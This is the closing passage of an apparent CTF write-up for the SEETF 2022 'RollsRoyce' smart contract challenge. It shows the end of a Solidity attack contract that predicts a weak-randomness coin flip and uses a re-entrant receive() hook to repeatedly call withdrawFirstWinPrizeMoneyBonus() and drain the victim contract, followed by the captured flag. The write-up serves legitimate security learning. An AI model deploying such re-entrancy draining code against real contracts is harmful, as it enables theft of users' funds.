</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>).</span><span class=nb>balance</span> <span class=o>&gt;=</span> <span class=mi>1</span> <span class=kc>ether</span><span class=p>,</span> <span class=s>&#34;Send contract some ether&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>RollsRoyce</span><span class=p>.</span><span class=n>CoinFlipOption</span> <span class=n>result</span> <span class=o>=</span> <span class=n>flipCoin</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=n>victim</span><span class=p>.</span><span class=n>guess</span><span class=p>{</span><span class=nb>value</span><span class=o>:</span> <span class=mi>1</span> <span class=kc>ether</span><span class=p>}(</span><span class=n>result</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>victim</span><span class=p>.</span><span class=n>revealResults</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>pwnContract</span><span class=p>()</span> <span class=k>public</span> <span class=k>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=kt>uint</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>3</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>win</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>victim</span><span class=p>.</span><span class=n>withdrawFirstWinPrizeMoneyBonus</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>receive</span><span class=p>()</span> <span class=k>external</span> <span class=k>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>victim</span><span class=p>.</span><span class=n>viewWins</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>))</span> <span class=o>&gt;=</span> <span class=mi>3</span> <span class=o>&amp;&amp;</span> <span class=kt>address</span><span class=p>(</span><span class=n>victim</span><span class=p>).</span><span class=nb>balance</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>victim</span><span class=p>.</span><span class=n>withdrawFirstWinPrizeMoneyBonus</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>getBalance</span><span class=p>()</span> <span class=k>public</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>).</span><span class=nb>balance</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>withdrawBalance</span><span class=p>(</span><span class=kt>uint</span> <span class=n>amount</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>==</span> <span class=n>owner</span><span class=p>,</span> <span class=s>&#34;You not owner!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>).</span><span class=nb>balance</span> <span class=o>&gt;=</span> <span class=n>amount</span><span class=p>,</span> <span class=s>&#34;This contract has no more funds!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=kt>bool</span> <span class=n>success</span><span class=p>,</span> <span class=p>)</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>.</span><span class=nb>call</span><span class=p>{</span><span class=nb>value</span><span class=o>:</span> <span class=n>amount</span><span class=p>}(</span><span class=s>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>For simplicity, everything can be done from within a single function call <code>pwnContract()</code> itself, which includes winning the coin flip 3 times consecutively, and also making the call to the exploitable <code>withdrawFirstWinPrizeMoneyBonus()</code> function. We simply just have to call the <code>pwnContract()</code> function, transfer 3 ether to it and then, we&rsquo;d solve the challenge.</p><p>To also make things more realistic, we can also implement a <code>withdrawBalance()</code> function to withdraw funds from the contract (otherwise the funds are simply stuck in the contract and lost forever once deployed!)</p><p>Once we call <code>pwnContract()</code>, we can see that challenge has been solved and isSolved() has been set to true!</p><p><img loading=lazy src=https://user-images.githubusercontent.com/33711159/173044701-0a860127-b0f7-436e-9191-da44ab4f23f2.png alt=image></p><p>Now let&rsquo;s go grab our flag :)</p><p><img loading=lazy src=https://user-images.githubusercontent.com/33711159/173044866-3814bcf0-144b-44a3-adcd-98cb18aca9cd.png alt=image>
<code>SEE{R4nd0m_R0yC3_6390bc0863295e58c2922f4fca50dab9}</code></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://quentinkhoo.github.io/tags/ctf/>ctf</a></li><li><a href=https://quentinkhoo.github.io/tags/seetf-2022/>seetf-2022</a></li><li><a href=https://quentinkhoo.github.io/tags/blockchain/>blockchain</a></li><li><a href=https://quentinkhoo.github.io/tags/smart-contracts/>smart-contracts</a></li><li><a href=https://quentinkhoo.github.io/tags/re-entrancy/>re-entrancy</a></li><li><a href=https://quentinkhoo.github.io/tags/pseudorandomness/>pseudorandomness</a></li></ul><nav class=paginav><a class=prev href=https://quentinkhoo.github.io/posts/seetf-2022-smart-contract-dupersupersafe/><span class=title>« Prev</span><br><span>SEETF 2022 Smart Contract DuperSuperSafe</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share SEETF 2022 Smart Contract Challenge - RollsRoyce on twitter" href="https://twitter.com/intent/tweet/?text=SEETF%202022%20Smart%20Contract%20Challenge%20-%20RollsRoyce&url=https%3a%2f%2fquentinkhoo.github.io%2fposts%2fseetf-2022-smart-contract-rolls-royce%2f&hashtags=ctf%2cseetf-2022%2cblockchain%2csmart-contracts%2cre-entrancy%2cpseudorandomness"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share SEETF 2022 Smart Contract Challenge - RollsRoyce on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fquentinkhoo.github.io%2fposts%2fseetf-2022-smart-contract-rolls-royce%2f&title=SEETF%202022%20Smart%20Contract%20Challenge%20-%20RollsRoyce&summary=SEETF%202022%20Smart%20Contract%20Challenge%20-%20RollsRoyce&source=https%3a%2f%2fquentinkhoo.github.io%2fposts%2fseetf-2022-smart-contract-rolls-royce%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share SEETF 2022 Smart Contract Challenge - RollsRoyce on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fquentinkhoo.github.io%2fposts%2fseetf-2022-smart-contract-rolls-royce%2f&title=SEETF%202022%20Smart%20Contract%20Challenge%20-%20RollsRoyce"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share SEETF 2022 Smart Contract Challenge - RollsRoyce on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fquentinkhoo.github.io%2fposts%2fseetf-2022-smart-contract-rolls-royce%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share SEETF 2022 Smart Contract Challenge - RollsRoyce on whatsapp" href="https://api.whatsapp.com/send?text=SEETF%202022%20Smart%20Contract%20Challenge%20-%20RollsRoyce%20-%20https%3a%2f%2fquentinkhoo.github.io%2fposts%2fseetf-2022-smart-contract-rolls-royce%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share SEETF 2022 Smart Contract Challenge - RollsRoyce on telegram" href="https://telegram.me/share/url?text=SEETF%202022%20Smart%20Contract%20Challenge%20-%20RollsRoyce&url=https%3a%2f%2fquentinkhoo.github.io%2fposts%2fseetf-2022-smart-contract-rolls-royce%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://quentinkhoo.github.io>Quentin</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>